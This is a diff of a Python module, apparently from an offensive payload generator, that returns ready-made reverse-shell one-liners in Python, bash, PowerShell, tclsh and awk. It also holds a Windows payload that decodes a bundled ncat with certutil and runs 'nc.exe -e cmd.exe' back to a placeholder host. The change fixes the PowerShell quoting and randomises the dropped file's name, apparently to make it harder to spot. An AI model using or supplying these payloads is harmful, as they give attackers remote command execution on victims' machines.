@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 from binary import WINDOWS_NCAT, binary_to_bat, shellcode_to_ps1
+from classes import generate_file_name
 
 def REV_PYTHON_TCP():
 	return """python -c \"import os; import pty; import socket; lhost = 'TARGET'; lport = PORT; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();\" """
@@ -26,7 +27,7 @@ def BASH_TCP():
 	return """/bin/bash -i >& /dev/tcp/TARGET/PORT 0>&1"""
 
 def REV_POWERSHELL_TCP():
-	return """powershell -nop -ep bypass -Command '$ip="TARGET";$port=PORT;$client = New-Object System.Net.Sockets.TCPClient($ip, $port);$stream=$client.GetStream();[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes(\\"Windows PowerShell running as user \\" + $env:username + \\" on \\" + $env:computername + \\"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\\");$stream.Write($sendbytes,0,$sendbytes.Length);$sendbytes = ([text.encoding]::ASCII).GetBytes(\\"PS \\" + (Get-Location).Path + \\"> \\");$stream.Write($sendbytes,0,$sendbytes.Length);while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $returndata = ([text.encoding]::ASCII).GetString($bytes, 0, $i); try { $result = (Invoke-Expression -command $returndata 2>&1 | Out-String ) } catch { Write-Warning \\"Something went wrong with execution of command on the target.\\"; Write-Error $_; }; $sendback = $result +  \\"PS \\" + (Get-Location).Path + \\"> \\"; $x = ($error[0] | Out-String); $error.clear(); $sendback = $sendback + $x; $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbytes, 0, $sendbytes.Length); $stream.Flush();}; $client.Close(); if ($listener) { $listener.Stop(); };'"""
+	return """powershell -nop -ep bypass -Command '$ip=\\"TARGET\\";$port=PORT;$client = New-Object System.Net.Sockets.TCPClient($ip, $port);$stream=$client.GetStream();[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes(\\"Windows PowerShell running as user \\" + $env:username + \\" on \\" + $env:computername + \\"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\\");$stream.Write($sendbytes,0,$sendbytes.Length);$sendbytes = ([text.encoding]::ASCII).GetBytes(\\"PS \\" + (Get-Location).Path + \\"> \\");$stream.Write($sendbytes,0,$sendbytes.Length);while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $returndata = ([text.encoding]::ASCII).GetString($bytes, 0, $i); try { $result = (Invoke-Expression -command $returndata 2>&1 | Out-String ) } catch { Write-Warning \\"Something went wrong with execution of command on the target.\\"; Write-Error $_; }; $sendback = $result +  \\"PS \\" + (Get-Location).Path + \\"> \\"; $x = ($error[0] | Out-String); $error.clear(); $sendback = $sendback + $x; $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbytes, 0, $sendbytes.Length); $stream.Flush();}; $client.Close(); if ($listener) { $listener.Stop(); };'"""
 
 def REVERSE_TCLSH():
 	return """echo 'set s [socket TARGET PORT];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh"""
@@ -62,7 +63,8 @@ def REVERSE_AWK_UDP():
     return """awk 'BEGIN {s = "/inet/udp/0/TARGET/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""
 
 def REVERSE_WINDOWS_NCAT_TCP():
-	return  """{0}\ncertutil -decode %Temp%\\nc.b64 %Temp%\\nc.exe\n%Temp%\\nc.exe -e cmd.exe TARGET PORT\ndel %Temp%\\nc.exe\n""".format(binary_to_bat(WINDOWS_NCAT, file="%Temp%\\nc.b64"))
+	nc_out = generate_file_name()
+	return  """{0}\ncertutil -decode %Temp%\\{1}.b64 %Temp%\\{1}.exe\n%Temp%\\{1}.exe -e cmd.exe TARGET PORT\ndel %Temp%\\{1}.exe\n""".format(binary_to_bat(WINDOWS_NCAT, file="%Temp%\\{0}.b64".format(nc_out)), nc_out)
 
 def REVERSE_WINDOWS_BLOODSEEKER_TCP():
 	return """ Custom Shell requires a Custom code. """
